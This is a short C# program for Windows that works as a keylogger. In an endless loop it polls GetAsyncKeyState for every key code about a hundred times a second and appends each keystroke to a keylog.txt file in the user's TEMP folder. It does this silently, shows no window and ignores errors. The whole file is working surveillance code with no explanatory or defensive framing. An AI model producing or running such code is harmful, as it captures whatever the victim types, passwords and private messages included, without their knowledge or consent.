using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

class Program
{
    [DllImport("user32.dll")]
    private static extern short GetAsyncKeyState(int vKey);

    static void Main()
    {
        KeysConverter keyConverter = new KeysConverter();
        string text = "";
        string path = Path.Combine(Environment.GetEnvironmentVariable("TEMP"), "keylog.txt");

        while (true)
        {
            Thread.Sleep(10);
            for (int i = 0; i < 255; i++)
            {
                try
                {
                    int key = GetAsyncKeyState(i);
                    if (key == 1 || key == -32767)
                    {
                        text = keyConverter.ConvertToString(i);
                        using (StreamWriter sw = File.AppendText(path))
                        {
                            sw.WriteLine(text);
                        }
                    }
                }
                catch (Exception ex)
                {
                    // Optionally log or handle exceptions
                }
            }
        }
    }
}
